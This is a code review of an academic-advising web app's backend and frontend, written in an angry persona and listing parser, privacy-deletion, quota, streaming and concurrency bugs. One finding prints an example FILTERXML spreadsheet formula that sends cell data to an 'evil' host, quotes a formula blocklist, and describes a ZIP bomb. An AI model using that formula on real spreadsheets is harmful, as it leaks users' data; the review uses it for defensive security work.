# mimo_scan.md

**A code review written by someone who has had the worst day of his life and is now
looking at 445 Python files and 89 TypeScript files.**

Reviewer: MiMo. Mood: furious. Sleep: none. Coffee: cold.

I was handed this repository and told to find every bug, every error, every teeny tiny
detail that is amiss. Consider this my formal discharge of that duty. Everything below was
read against the code as it stands in the working tree (uncommitted changes included — yes,
I noticed the tree is dirty with modifications across nearly every backend module, which is
*exactly* the kind of thing I want to see when someone hands me a codebase and says "review
it"). Findings marked **VERIFIED** were reproduced by running the actual code or reading the
actual SQL. Findings marked **NEEDS VERIFICATION** are real inconsistencies I could not
prove reachable — I am furious, not dishonest.

Nothing here is a style nit. `ruff` passes. The lint is clean. The *semantics* are where
this thing bleeds out.

---

## Contents

- [Tier 0 — The house is on fire](#tier-0--the-house-is-on-fire)
- [Tier 1 — Serious, fix this week](#tier-1--serious-fix-this-week)
- [Tier 2 — Annoying, fix before it bites](#tier-2--annoying-fix-before-it-bites)
- [Tier 3 — Small things I am still angry about](#tier-3--small-things-i-am-still-angry-about)
- [Things I checked that are NOT broken](#things-i-checked-that-are-not-broken)
- [Verdict](#verdict)

---

## Tier 0 — The house is on fire

### 0.1 The prerequisite graph is being fed fabricated course codes. By the parser. Every day.

**File:** `backend/app/atlas/requisites.py:17-21`, `:173`, `:188`
**Status:** **VERIFIED — reproduced live**

There is exactly *one* hard rule in this repository. ONE. It is printed in bold at the top of
`AGENTS.md`:

> **An LLM never writes, edits, infers, or fills in any of its nodes or edges.** A
> prerequisite the parser can't handle is a parser fix or a manual fix, never a model call.

Great. Wonderful. Nobody told the *parser*, which is happily inventing course codes out of
ordinary English prose and writing them into `prereq_nodes` as real prerequisite edges:

```python
_SUBJECT = r"(?:[A-Z]{6,7}|[A-Za-z]{2,5})(?:_OX)?"     # ANY 2-5 letter word, any case
_CODE_RE  = re.compile(rf"({_SUBJECT})\s?({_DIGITS})\b|\b({_DIGITS})\b")
...
    match = _CODE_RE.match(segment, i)                   # no leading word boundary
    ...
    code = normalize_code(f"{subject} {tail}")           # shape check only
```

The docstring at lines 16-18 has the *audacity* to claim: *"A two-letter suffix … and a 6-7
letter subject must be uppercase, so ordinary words … are not read as codes."* That is true
of the 6-7 letter branch and completely false of the 2-5 letter branch, which accepts
lowercase, with no word boundary in front of it. I ran it:

| Input | Result |
|---|---|
| `Prerequisite: BIO 101 and lab 201` | status **`parsed`**, tree = `BIO 101 ∧ LAB 201` |
| `Prerequisite: held 345 seats` | mention `HELD 345` |
| `Prerequisite: MATH 111or112` | mention `OR 112` — and **`MATH 111` is dropped entirely** |

Read that first row again. `LAB 201` does not exist. It is a laboratory, not a course. And it
comes out as a **`parsed`** tree — not `unparsed`, not `ambiguous`, *parsed* — which means
`atlas/importer.py:_write_course` writes it into `prereq_nodes` as a genuine prerequisite
edge. From there `advising/sequence.py` turns it into a `missing_prerequisite` blocker for a
real student trying to plan a real semester, and `generation/advising_tools.py` hands it to
the model as a *fact*.

So the model doesn't have to hallucinate the prerequisite graph. The deterministic parser
beats it to it. Congratulations to everyone involved.

The third row is its own special failure: the module's own comment at line 113 says run-together
text like `"BIOL 151or"` occurs in the catalog, the `_RUN_TOGETHER_RE` repair at line 114 exists
to fix it, and `(and|or)\b` fails the moment digits follow — so the repair misses, the scanner
drops `MATH 111` on the floor, and fabricates `OR 112`. Correct fix, wrong regex, one character.

**Fix:** require a word boundary before the subject; validate the subject against the known
subject set (the guard `programs/requirements.py:107-115` *already has* — why does this module
not use it?); extend `_RUN_TOGETHER_RE` to `(\d{3}[A-Za-z]?)(and|or)(?=\d)`. And nothing —
*nothing* — with an unvalidated subject should ever reach `prereq_nodes`/`prereq_mentions`.

`tests/test_requisites.py:129-130` tests only `"Complete 101 credits"` — an 8-letter word,
i.e. the one case that works. The 2-5 letter range where the bug lives is untested. Of course
it is.

---

### 0.2 "Permanent deletion" permanently fails, and permanently deletes nothing

**Files:** `backend/app/privacy/service.py:19-34`, `backend/app/db/queries/privacy.sql:153`,
`backend/app/db/baseline/032_schema.sql:2444, 2548, 2716`
**Status:** **VERIFIED — FK direction confirmed in baseline schema**

`_DELETE_STEPS` is the ordered list of every table wiped when a student exercises their right
to be deleted. It contains 14 steps. It is missing at least **five** tables that reference
`operations`, and then it deletes `operations` anyway:

```python
_DELETE_STEPS = (
    ...
    "delete_workspace_operations",      # <-- deletes the parent
    "delete_workspace_academic_records",
    ...
)
```

```sql
-- 032_schema.sql:2444
ADD CONSTRAINT claim_reviews_operation_id_fkey
  FOREIGN KEY (operation_id) REFERENCES public.operations(operation_id);   -- NO ACTION
-- :2548 decisions_operation_id_fkey  ... same
-- :2716 provider_batch_items_operation_id_fkey ... same
```

`claim_reviews` and `decisions` are not in `_DELETE_STEPS`. Their `operation_id` is `NOT NULL`
(`:421-425`, `:649-653`). The FK is `NO ACTION`, and `artifact_run_unit_calls` references
`operation_calls ... ON DELETE RESTRICT` (`:2332`), which cascades out of `operations`
(`:2636`). So for any workspace that has used claim review, research decisions, provider
batches, or planned artifact runs:

1. `DELETE FROM operations` throws `ForeignKeyViolation`.
2. `_delete_owned_rows` (`privacy/service.py:361-365`) records the deletion as **failed**.
3. `resume_deletion` (`:317-358`) re-runs the *identical* ordered steps and fails again.
4. Forever. The student can never be deleted. Congratulations.

And even if it didn't crash, those rows are simply never removed: `claim_reviews.input_snapshot`
(up to 1 MB of claim text per row), `decisions.request_json`, `provider_batches` state, and
`debug_experiments.snapshot` (a **full conversation snapshot**, `migrations/066_debug_experiments.sql:4-15`)
all survive "permanent deletion". That is a privacy claim that is false in both directions:
it doesn't delete, and it says it did.

`backend/tests/test_privacy_retention.py` deletes a workspace with conversations, artifacts and
records. Nothing else. So the one path that actually breaks is the one path not covered. I am
going to lie down.

**Fix:** delete `claim_reviews`, `decisions`, `provider_batch_items`/`provider_batches`,
`debug_experiments`, and `tool_execution_*` **before** `delete_workspace_operations`. Add a
deletion test that seeds them.

### 0.2b And while we're here: the student's actual questions and answers are never deleted at all

`retrieval_traces.query` / `normalized_query` (the student's question, `032_schema.sql:1112-1122`)
and `responses.text` / `context_snapshot` (the generated answer plus the retrieved context,
`:1057-1065`) have no workspace key and no delete step anywhere. There is no `DELETE FROM`
for `retrieval_traces`, `responses`, `claims`, `citations`, `model_calls`, `trace_contributions`
or `trace_seams` in the entire `db/queries/` tree — checked.

Note the intent is unambiguous: `retrieval_gaps.query` *is* deleted (`delete_workspace_gaps`).
So the same query string is erased from one table and retained verbatim in another. That is
not a policy, it's a coin flip.

**Fix:** workspace-scoped trace/response deletion, or a documented tombstone-linked purge.

---

### 0.3 Quota enforcement is decorative. `/api/query` and `/api/runs` are unlimited.

**Files:** `backend/app/quotas/service.py:133-161`, `:251-290`,
`backend/app/api/routes/corpus.py:96-111`, `backend/app/api/routes/runs.py:216-230`
**Status:** **VERIFIED — grep confirms production has zero callers**

`QuotaService.check_and_consume` is the *only* function that enforces `queries_per_minute`,
`queries_per_day`, or `max_active_jobs`. I grepped every call site in the repository:

```
./app/quotas/service.py:133:    def check_and_consume(          # definition
./tests/test_rate_limits_and_quotas.py:21,22,26,41,45,91,132,258   # TESTS. ALL TESTS.
```

Eight call sites. All of them in the test file. **Production never calls it.** The synchronous
answer endpoint `POST /api/query` (`corpus.py:96`) and `POST /api/runs` (`runs.py:226`) generate
model output without ever reading or incrementing a quota bucket. Only the conversation path
charges anything, via `settle_generation` at `conversations/store.py:295`, and that only ever
writes the `queries` bucket.

So `tokens_per_day` and `spend_usd_per_day` are stored in `quota_policies`, validated on the
admin API, displayed by `GET /api/quotas/effective`, and **checked absolutely nowhere**. An
admin who sets `spendUsdPerDay: 5` has purchased the warm fuzzy feeling of a limit and
received precisely nothing.

The tests pass, of course. The tests call the function. That's what tests are *for*, apparently.

**Fix:** route every generation entrypoint (query, runs, batches, decisions) through one
admission/settlement hook with the `request_id` idempotency `settle_generation` already has,
and charge `tokens`/`cost_usd` post-call.

### 0.3b And the quota code that does exist compares every bucket type against the *query* limit

**File:** `backend/app/quotas/service.py:251-290` — **VERIFIED, read the code myself**

```python
if minute_count + delta_count > policy.queries_per_minute:    # any bucket_type
    ...detail=f"Rate limit exceeded: maximum {policy.queries_per_minute} queries per minute."
if day_count + delta_count > policy.queries_per_day:          # any bucket_type
```

`_consume_window` is parameterised by `bucket_type` (`'queries' | 'tokens' | 'cost_usd'`) and
then unconditionally compares against `queries_per_*`. A `tokens` settlement of 50,000 is
judged against a query limit. A `queries` settlement would exhaust the token quota. Latent
today only because of 0.3 — which is a hell of a sentence to write.

While I'm here: `upsert_policy` (`quotas.sql:31-48`) uses `DO UPDATE SET x = EXCLUDED.x`, and
`QuotaPolicyUpsertRequest` defaults every field to `None`. So `POST /api/admin/quotas` with
`{"queriesPerMinute": 5}` **NULLs out** `queries_per_day`, `tokens_per_day`, `spend_usd_per_day`
and `max_active_jobs`, and `_kept()` (`service.py:108-110`) silently substitutes defaults. A
workspace customised to `spendUsdPerDay=100` reverts to 10 because someone touched the minute
limit. Use `COALESCE(EXCLUDED.x, quota_policies.x)`. And `prune_expired_quota_buckets`
(`quotas.sql:78-80`) has no caller anywhere, so `quota_buckets` grows without bound forever.

---

### 0.4 An empty `programs.jsonl` retires every program and destroys every reviewed rule release

**Files:** `backend/app/programs/importer.py:23-34`, `:49-57`,
`backend/app/db/queries/programs.sql:5-8, 24-32`
**Status:** **VERIFIED — read `load_programs`, confirmed no empty guard; SQL predicate confirmed**

```python
records = load_programs(path)          # empty file -> []
...
conn.execute(queries.get("retire_missing_programs"), {
    "collection_id": collection_id,
    "program_ids": [program_id(collection_id, r["title"]) for r in records],   # []
})
```

```sql
UPDATE programs SET is_active = false, current_rule_release_id = NULL
WHERE collection_id = %(collection_id)s
  AND NOT (program_id = ANY(%(program_ids)s::uuid[]));   -- ANY('{}') is false for ALL rows
```

`load_programs` skips blank lines and returns `[]` on an empty or truncated file. `NOT
(program_id = ANY('{}'))` is true for every row. So a truncated download, a wrong `--file`
path, or a blank file causes `import_programs` to **retire every program in the collection and
archive every rule release** (`archive_incompatible_program_releases`,
`clear_inactive_program_release_pointers`) — and exit 0, printing `programs: 0`, like a
perfectly successful run.

Re-importing restores `is_active`, but nothing un-archives releases or restores
`current_rule_release_id`. The reviewed-rule workflow is gone.

And here is the part that makes me want to throw my laptop: **`atlas/importer.py:169-172`
already guards against exactly this.** It has a comment and everything:

> *"An empty atlas would make delete_courses_not_in_atlas remove every course"*

...and raises. The programs importer is missing the identical guard. Someone wrote the
correct answer in one file and didn't copy it two directories over.

**Fix:** `load_programs`/`import_programs` raises `ValueError` on zero records before any write.

---

### 0.5 Streamed answers silently opt out of greedy decoding. The audit log then lies about it.

**File:** `backend/app/llm/adapters.py:357-365` (Anthropic), `:438-451` (Google)
**Status:** **VERIFIED — both `stream()` payloads read; `generate()` passes temperature, `stream()` does not**

`AGENTS.md`, again in bold: *"Generation is greedy deliberately so eval runs are reproducible.
Don't add sampling defaults."*

`generate()` forwards `request.temperature` (lines 331-332, 403-404). Both `stream()`
implementations drop it on the floor:

```python
payload = {"model": ..., "max_tokens": ..., "messages": messages, "stream": True}
if system: payload["system"] = system
# temperature? never heard of her
```

`answer.py:256` sets `temperature=0` under `sampling_policy="greedy"` (the default). The
conversation worker streams whenever `on_provisional_text` is set. So every streamed
conversation answer on Anthropic runs at the provider default — **temperature 1.0** — sampled
and non-reproducible, and then `evidence.py:50` records `requested_temperature = 0` in
`model_calls`.

That's not just a reproducibility bug. That's a falsified audit record.

**Fix:** include `temperature` (and the response schema) in both stream payloads exactly as
`generate()` does.

### 0.5b OpenAI streaming publishes truncated output as a complete grounded answer

**File:** `backend/app/llm/adapters.py:299-319`, `backend/app/generation/answer.py:331-344`

The Responses API terminates streams with `response.completed`, `response.incomplete`
(truncation), or `response.failed`. This loop only looks for `response.completed`:

```python
elif _get(event, "type") == "response.completed":
    final = _get(event, "response")
...
yield StreamEvent("completed", result=GenerationResult("".join(parts),
                   finish_reason=_get(final, "status", "unknown"), ...
```

On `incomplete`/`failed`, `final` stays `None` and the generator yields a **completed** event
with `finish_reason="unknown"` and partial text. `_reject_unusable` rejects
`{"length","max_tokens","incomplete"}` and `{"content_filter","error","tool_calls","failed"}`
— `"unknown"` sails straight through. So a stream cut mid-generation is validated and
published as a complete grounded answer whenever the surviving paragraphs happen to carry
citations, which at a paragraph boundary is *always*.

`GenerationResult`'s default `finish_reason="unknown"` (`base.py:169`) widens the same hole for
every provider that omits the field. A fail-closed validator with an accept-by-default
fallback is not fail-closed.

**Fix:** raise if the stream ends without `response.completed`; treat `"unknown"` as untrusted
in `_reject_unusable` — reject by default, accept only known-terminal reasons.

---

## Tier 1 — Serious, fix this week

### 1.1 Read-only support grants are not read-only

**Files:** `backend/app/advising/audit_service.py:37-43, 156, 192`,
`backend/app/advising/comparison_service.py:97, 193, 221`, `backend/app/records/service.py:104-112`

The grant model is explicit: `AdminStore.create_grant` rejects `support_access` with write
rights (`store.py:527-528`, *"support access is read-only"*) and `grants.sql:59` enforces
`grant_type <> 'support_access' OR %(action)s = 'read'`. Yet `run_audit`
(POST `/api/audits/run`), `ProgramComparisonService.create` (POST `/api/comparisons`) and even
the GET-only `get_record` authorize with `action="read"` and then **write** rows
(`degree_audits`, `audit_rule_evaluations`, `comparisons`, `academic_records`) into the target
student's workspace. A read-only grant holder mutates a protected workspace, and those rows
then appear in the student's privacy export.

Worse: `get_record` calls `get_or_create_record` on a **read** path. A GET that creates.

**Fix:** authorize these as `action="write"`, or key derived rows to the grant actor. And never
create a row on a read path.

### 1.2 The last-administrator invariant has a TOCTOU race and ends in permanent lockout

**Files:** `backend/app/admin/store.py:144-159`, `backend/app/db/queries/admin.sql:54-56`

`admin_lock_user` locks the *target* row; the active-admin count is an unlocked `count(*)`
under READ COMMITTED. Two admins demoting each other concurrently each lock a different row,
each observe `admins == 2`, both commit. Zero active admins. The invariant is then permanently
broken and recovery requires direct database access.

**Fix:** serialize the invariant — `LOCK TABLE app_users IN SHARE ROW EXCLUSIVE MODE`, or
`SELECT ... FOR UPDATE` over all active admin rows before counting.

### 1.3 A failed job strands the conversation forever (and lies about it in the stream)

**Files:** `backend/app/conversations/worker.py` (only `publish_success`, `:224-282`),
`backend/app/jobs/worker.py:99-110`, `backend/app/db/queries/conversations.sql:60-62`

When `ConversationTurnExecutor` raises, `run_once` writes a job failure to `jobs` and nothing
else. Nothing transitions `conversation_requests` out of `'pending'` or clears
`conversations.pending_request_id`. So `_lock_request_slot` rejects every subsequent turn with
409 "has a pending request", `begin_summary` and `reset_memory` are blocked too, and
`stream_events` reports `done: True` next to `requestState: "pending"` — the client sees a
finished stream while the conversation stays fenced. The only escape is the manual
`POST .../abandon` route.

Compare the synchronous path (`routes/conversations.py:554-564`), which always settles the
request on failure. Two code paths, one contract. Also `store.abandon` writes the turn as
`type: "abandoned"` even when the job actually *failed*, mislabelling the outcome in the
student's transcript.

**Fix:** settle the request in the same transaction as the terminal job failure. At minimum,
`done` must reflect `request_state != "pending"`.

### 1.4 A summary overflow wedges a conversation for five minutes

**Files:** `backend/app/conversations/compact.py:371-382, 219-227`, `store.py:497-501`

```python
budget = min(max_chars - ..., max_bytes - len(header.encode()) - len(suffix.encode()))
narrative = text[:max(0, budget)].rstrip()     # char slice against a byte budget
```

Budget computed in **bytes**, applied as a **character** slice. Multi-byte text (CJK, emoji —
3-4 bytes/char) blows through the store's hard 80,000-byte cap in `finish_summary`, which
raises 422 *before* touching the row. The summary stays `pending`, `compact_conversation`
swallows the `HTTPException` (`:226`) without calling `_fail_summary`, and a pending summary
makes `_lock_request_slot` reject **all new turns** until `expire_stale_pending_summary` ages
it out at `_STALE_SUMMARY_SECONDS = 300`. One unlucky emoji locks a conversation for five
minutes.

**Fix:** truncate on the encoded byte budget; call `_fail_summary` in that `except` branch.

### 1.5 The XLSX formula blocklist blocks WEBSERVICE and forgets FILTERXML

**File:** `backend/app/artifacts/xlsx.py:25-29` (guards both import `:108` and export `:278`)

```python
_FORMULA_BLOCKLIST = re.compile(
    r"\b(?:WEBSERVICE|RTD|CALL|REGISTER|EXEC|HYPERLINK)\s*\(|\[[^]]+\]|\|", re.IGNORECASE)
```

`FILTERXML(url, xpath)` is Excel's companion to `WEBSERVICE` and performs an HTTP GET of an
arbitrary URL. `=FILTERXML("http://evil/?d="&A1,"//a")` passes this blocklist, is written as a
live formula, and makes the *user's* Excel fetch an attacker-controlled URL that can include
other cell values. We blocked the exfiltration function and forgot its partner.

**Fix:** add `FILTERXML`. Better: allowlist a small arithmetic formula grammar instead of
blacklisting. Denylists are how we got here.

### 1.6 `STORAGE_BACKEND=dual` makes an in-memory dict the durable primary

**Files:** `backend/app/storage/factory.py:22-26`, `backend/app/storage/dual.py:25-32`,
`backend/app/storage/blob.py:26-42`

```python
if backend == "dual":
    blob_adapter = BlobStorageAdapter()   # <-- writes to self._store: dict. No Azure SDK.
    return DualReadStorageAdapter(primary=blob_adapter, secondary=local_adapter)
```

```python
obj = self.primary.put(...)                    # volatile memory
try: self.secondary.put(...)                   # the only durable copy
except StorageError as exc:
    logger.warning("Dual-read secondary write failed for key %s: %s", key, exc)  # swallowed
return obj                                     # success!
```

`BlobStorageAdapter.put` writes to a Python dict regardless of `connection_string` or
`account_url`. In `dual` mode, a write whose *local disk* write fails (disk full, permissions)
is reported as success, exists only in process memory, and vanishes on restart. This is
precisely the "one backend succeeds, the other fails silently" hazard the seam exists to
prevent.

`AGENTS.md` already says *"a remote Blob provider is still a deployment gate."* The factory
does not enforce that gate. **Fix:** refuse `blob`/`dual` until the remote provider exists;
fail `put` when the only durable backend fails.

### 1.7 `atlas`-adjacent: the sequence planner blocks valid courses over a label-grammar disagreement

**File:** `backend/app/advising/sequence.py:16-19, 100-113, 247-261`

`atlas/requisites.py` recognises `pre[ -]?requisites?` / `co[ -]?requisites?` (space allowed)
**and** the combined label `"Prerequisite or co-requisite:"` (EMO-028, a real catalog pattern,
tested at `tests/test_requisites.py:106-112`). `_RAW_LABEL_RE` in `sequence.py` recognises only
`co-?requisites?`/`prerequisites?` and knows nothing of the combined form. So:

- `requisites_raw = "Prerequisite or co-requisite: CHEM 150L"` → parses cleanly →
  `_required_raw_segments` yields `(("prerequisite","Prerequisite or"), ("corequisite","CHEM 150L"))`
  → `missing_raw_trees = {"prerequisite"}` → **`requirements_invalid` blocker, zero stages.**
- `"Co requisite: MATH 111"` (spaced form the parser explicitly accepts) → same false block.

A course whose requisites parse successfully is blocked as invalid because two label grammars
in two files disagree. Unify them.

### 1.8 `_repair_pdf_kerning` silently corrupts ordinary prose in every ingested PDF

**File:** `backend/app/ingest/extract.py:163-174`

```python
_PDF_COURSE_SPLIT_RE = re.compile(r"\b([A-Z]{2,7}|[A-Z][a-z]{1,11})\s(\d{1,2})\s(\d{2})\b")
return _PDF_COURSE_SPLIT_RE.sub(r"\1 \2\3", text)
```

Any capitalized word followed by `1-2 digits + 2 digits` gets glued. `"Section 2 14 of the
policy"` → `"Section 214 of the policy"`. `"Table 3 12"` → `"Table 312"`. `"May 3 24 deadline"`
→ `"May 324 deadline"`. This rewrites the *indexed text* — chunks, embeddings, keyword search —
of every ingested PDF. `tests/test_extract.py:137-143` covers course names and the lowercase
case only.

Related: `scripts/scrape_programs.py:173` extracts the catalog PDF with raw `page.extract_text()`
— no kerning repair at all — so the EMO-014 fix is not applied to the actual program-requirements
pipeline where course mentions get parsed. Two PDF paths, two different texts.

**Fix:** restrict the first group to known subject codes, or require the `\d{3}` course-number
shape and exclude section/table/chapter words.

---

## Tier 2 — Annoying, fix before it bites

| # | Where | What's wrong |
|---|---|---|
| 2.1 | `api/routes/auth.py:27-40` | `/api/session` calls `service.resolve` directly, skipping the `_boundary()` Host/origin/forwarded checks every other route gets. In dev, `resolve()` returns `role="admin"` purely from loopback `client_host` — so a DNS-rebinding page every other endpoint rejects can still read `workspaceKey`, `displayName`, `email`, `role`. It is the one route that "builds its own auth", which the codebase otherwise forbids. |
| 2.2 | `auth/capabilities.py:156-193` | `check_workspace_access` calls `conn.commit()` on denial — silently committing whatever the caller had pending. Also holds a `FOR SHARE` row lock from `check_active_resource_grant` across the caller's whole transaction, potentially across provider I/O. Use a savepoint or a separate connection. |
| 2.3 | `api/routes/admin.py:466-469, 537, 553` | `datetime.fromisoformat(body.expiresAt)` is uncaught → malformed input returns **500** instead of 422. `create_price_schedule` (same file, `:393-397`) does it correctly. Copy it. |
| 2.4 | `atlas/requisites.py:46` | `_CARRY_SEP = re.compile(r"\s*(?:(?:,|/|and|or)\s*)*")` — **no `re.IGNORECASE`**. `"MATH 111, 112, OR 115"` (all-caps PDF text) → `MATH 115` is **lost even from the mentions**. The program parser's equivalent (`programs/requirements.py:52`) *does* use `IGNORECASE`. |
| 2.5 | `scripts/eval_retrieval.py:19, 45-49` | Unconditionally writes `<repo>/runs/retrieval/<stamp>.json`. `git check-ignore` confirms `runs/` is **not** ignored (`data/` is; `runs/` appears in no gitignore rule). Violates "files go in DATA_DIR" and "don't create saved test output unless requested", and risks committing run noise. |
| 2.6 | `tests/test_no_llm_in_prereq.py:8-19` | The guard for the *one hard rule* does not scan `app/programs/**`, `app/simgraph/**`, `generation/research_*`, or `app/tools/**` — i.e. the model-adjacent code where a violation would appear first. `_BANNED_NAMES` omits `get_batch_provider`/`get_decision_provider`, and `importlib.import_module("app.llm...")` is invisible to the AST walk. Today clean (only `atlas/importer.py` writes `insert_prereq_*`); enforcement has holes exactly where new code lands. |
| 2.7 | `db/queries/prereq.sql:10-11, 26-27, 42-43` | `AND (%(workspace_key)s::text IS NULL OR s.workspace_key IS NULL OR s.workspace_key = ...)` — **inverted** vs `keyword.sql:28`/`embeddings.sql:21`. With `workspace_key=None` (the eval runner, `retrieval/evals.py:128-135`) the prereq seam returns **every workspace's private sources**, then `retrieve.py:106-119` raises `ContractViolation` and crashes the eval run while leaking private chunk identity into the seam trace. |
| 2.8 | `jobs/provider_batches.sql:135-143`, `jobs/provider_batches.py:403-413` | `update_provider_batch_progress` matches on identity only — no state guard. A stale `poll()` can rewrite `completed → in_progress`, NULL out `finished_at`, or clobber a terminal `failed`/`cancelled`, after which `publish_artifacts` rejects the batch until a later poll re-reaches terminal. |
| 2.9 | `jobs/provider_batches.py:635-686, 717-751` | `_collect_terminal` tolerates a second collector on item receipt (`:688-693`) but not on accounting. Two collectors both see `status == 'reserved'`, both call `account_usage`, the loser gets `OperationBudgetError("attempt_already_accounted")` — uncaught → **500** on the user's poll and the remaining items are never processed. |
| 2.10 | `jobs/provider_batches.py:425-434` | `cancel()` on an in-flight `submitting` batch immediately writes `unknown` and clears `submission_token`, without the lease check `poll()` correctly does at `:378-381`. If the provider accepted the batch, its results can never be collected. |
| 2.11 | `scripts/worker.py:167-176` | `store.recover_expired` in the maintenance loop is unguarded. One `PoolTimeout` or dropped connection every 5 s escapes `while True`, hits `finally`, and tears down **all** `--concurrency` worker threads mid-job. The sibling calls guard themselves. |
| 2.12 | `jobs/worker.py:111-120`, `jobs/store.py:281-297` | Heartbeats stop *before* `publish_success`, which can block on row locks inside the finish transaction. Lease expires mid-publish → `LeaseLost` after all generation work is done and rolled back; for `conversation.turn` (`max_attempts=1`) the job terminalizes as **failed** and a completed answer is lost. |
| 2.13 | `privacy/service.py:220-223` | Export expiry blocks *download* only. The export row holds a full copy of the student's data (conversations, artifacts, record, attempts, feedback, audits) and is deleted only on whole-workspace deletion. `set_privacy_export_expiry` exists in `privacy.sql:102-106` and is used only by tests. Every export ever created accumulates forever. |
| 2.14 | `artifacts/safety.py:51-67` | ZIP preflight trusts the attacker-declared `file_size`/`compress_size` (`zipfile` does not enforce them), then `archive.read(name)` inflates unbounded into memory before any bound applies. With `MAX_UPLOAD_BYTES = 20 MiB` a deflate bomb expands ~1000×. Enforce a running budget on *actual* decompressed bytes. |
| 2.15 | `storage/local.py:51-57, 29-49` | `get()` returns `path.read_bytes()` with no integrity check; `StorageIntegrityError` is unreachable. `put()` computes a sha256 and discards it. `content_type` is dropped on write and on `dual.py:41` backfill. The Protocol (`base.py:33-35`) promises "integrity verification". It is a comment. |
| 2.16 | `records/importer.py:235-241`, `records/service.py:370` | Duplicate rows in a CSV are flagged as `duplicate_row_in_csv` candidates and then **still appended to `parsed_rows`**, and `decisions = ["select"] * len(parsed_rows)` default-selects them. Two identical rows import two attempts, and since audits sum `earned_credits`, that's silently double-counted credit. Default duplicates to `"reject"`. |
| 2.17 | `frontend/src/components/shell/Shell.tsx:132-138` | `send` calls `chat.send(items)` (fire-and-forget, several silent early-return paths) then `setAttachments([])` **unconditionally**. If `createConversation` fails or the record hasn't loaded, the user's artifact references vanish. Clear only on acceptance. |
| 2.18 | `frontend/src/admin/AdminApp.tsx:~160-211` | `load()` is last-write-wins with no request-sequence guard. Rapid tab/pagination clicks apply responses in *completion* order; older payloads overwrite newer ones and each stale `finally` clears `busy` while a newer request runs. Every sibling panel (`GrantsPanel:42-55`, `FeatureFlagsPanel:55-65`, `AcademicRecordPanel:39-44`, …) does this correctly. Copy the `requestSeq.current` pattern. |
| 2.19 | `tests/test_contract_drift.py:17-21, 64-81` | The drift guard only compares **same-named** models in `app.api.schemas`. It misses: all route-local schemas (`GapSummary`, `GapResolution`, `ProfileViewDto`, …); every renamed pair (`RetrievalGap`/`GapSummary`, `Recommendation`/`RecommendationDoc`, `ConnectionProfile`/`ProfileViewDto`); every `export type` alias (`QueryResponse`, `ConversationTurnResponse`, `ConversationStreamEvent`, …) because the regex only matches `export interface`; and all nested objects and enum values. |
| 2.20 | `frontend/src/api/types.ts:541-546` vs `conversations/store.py:32-53` | `EffectiveConversationInputs.retrievalQuery` is declared **required** in TS and never sent by the backend — `_bounded_effective` drops it entirely and shrinks `spec` to `title/name/kind` while TS types it as full `NativeArtifactSpec`. Compiles fine, receives `undefined`. Exactly the drift 2.19 structurally cannot catch. |
| 2.21 | `api/routes/admin.py:810-827` | `POST /sources/{source_id}/lifecycle` builds its response dict by hand with **no `response_model`**, while `types.ts:1450-1454` declares `SourceLifecycleChangeResponse`. It slips past `test_openapi_complete.py` (the `-> dict` annotation yields a non-empty "object") and past the drift test. |
| 2.22 | `tests/test_jobs.py:139-151`, `test_jobs_runtime.py:201, 473-475`, `test_decisions.py:208-211` | Real `time.sleep` against real deadlines. `test_jobs.py` sleeps 1.4 s against a 1 s lease — a stalled machine expires the lease and the test fails for reasons unrelated to the behavior. `AGENTS.md`: *"Use `FakeClock`, never `sleep`."* |
| 2.23 | `tests/conftest.py:31-35` | The stated policy "a skipped DB test is a failure" is **not enforced anywhere**. There is no hook turning a skip of a `db`-marked test into a failure. The two existing skips are non-DB so nothing is currently broken — but the guarantee is vapor. |

---

## Tier 3 — Small things I am still angry about

**Backend — auth/admin**
- `admin/store.py:565-585, 643-652` — `list_grants` and `list_support_grant_requests` are the only admin list methods without an `offset < 0 → 422` guard. `OFFSET -1` → Postgres error → **500**. Every sibling (`users:113`, `jobs:366`, `sources:396`, …) has it.
- `api/routes/admin.py:162-174` — `revoke_user_sessions` skips the `_operation(principal, "users.manage")` check its sibling `update_user` performs. Nil impact today (admin holds all capabilities); inconsistent authorization surface for the day capabilities split.
- `db/queries/admin.sql:135-140` — `admin_list_conversation_turns` has `LIMIT 1000` and the transcript **export** (`store.py:791-799`) uses it. An artifact labelled "Owned conversation transcript as plain text" silently omits everything past turn 1000 with no marker. Exports are either complete or they say they aren't.
- `admin/store.py:851-872` — `publish_granted_result` marks the staging row `published` (committed) *before* the content check that can still 403. If the grant expires in the window, the requester gets 403, the row is durably `published`, and `publish` cannot be retried. Audit says `grant.result_published`; the user saw a denial.
- `db/queries/auth.sql:34-41` — session lookup `LEFT JOIN app_users` with `COALESCE(u.status,'active')`. A missing user row still authenticates. Fail open on auth. **NEEDS VERIFICATION** — I could not construct a reachable path today, because deletion never removes `app_users`.
- `api/routes/conversations.py:554-564` — the failure handler calls `store.finish(...)` inside `except`, and `store.finish` itself can raise `HTTPException(409)` when the request was abandoned concurrently — replacing the real failure reason with a currency complaint.
- `api/routes/connections.py:93-94, 126-128` — `conn` is declared before `repository` (`Depends(_admin)`), and FastAPI resolves dependencies in declaration order, so a remote caller burns a pool borrow and `ensure_database_ready` before `require_local_admin` rejects them. `routes/metrics.py:26-31` orders it correctly.

**Backend — providers/generation**
- `llm/adapters.py:516-517` — `response.choices[0]` unguarded: empty `choices` → raw `IndexError` outside the sanitized error boundary, so `except ProviderError` misses it and the worker records `execution_failed` with no diagnosis. `_usage`/`_chat_usage` (`:26-48`) `int()` unvalidated provider fields with the same problem.
- `llm/adapters.py:426-429` — Google tool-call IDs fall back to the tool *name*; two calls to the same tool in one turn collide, and `controller.py:157-168` keys `executed` by `call.id`. Different args → `ToolCallChanged` kills the turn; identical args → silently replayed. **NEEDS VERIFICATION** on whether `google-genai` populates `function_call.id`.
- `api/query_service.py:51-72, 483-491` — retry after a mid-stream failure re-invokes `generate_answer` without `on_provisional_reset()`. The student's live view concatenates a partial draft with the entire retry output. (It's issued on `GenerationRejected` at `:493-494`; same gap on the quality-fallback path at `:510-517`.)
- `api/query_service.py:273-300` — `_append_warm_citations` rebuilds `CitedChunk`s from a prior turn with `chunk_index=0` and no re-validation that the chunk still exists, is `is_current`, or is in the current source selection. **NEEDS VERIFICATION** — the revision-pinned source fence may make this unreachable.
- `generation/answer.py:186-204` — chunk text and history are defanged and wrapped in `<<<… (untrusted)>>>`, but the **student's query is interpolated raw** after `<<<END CONTEXT>>>`. A query containing `<<<` forges sentinel boundaries and impersonates the trailing instruction block. `query_plan.py:94-99` does it correctly. Prompt-injection surface note (self-injection), not a data-path bug — but it's the kind of asymmetry that gets worse later.
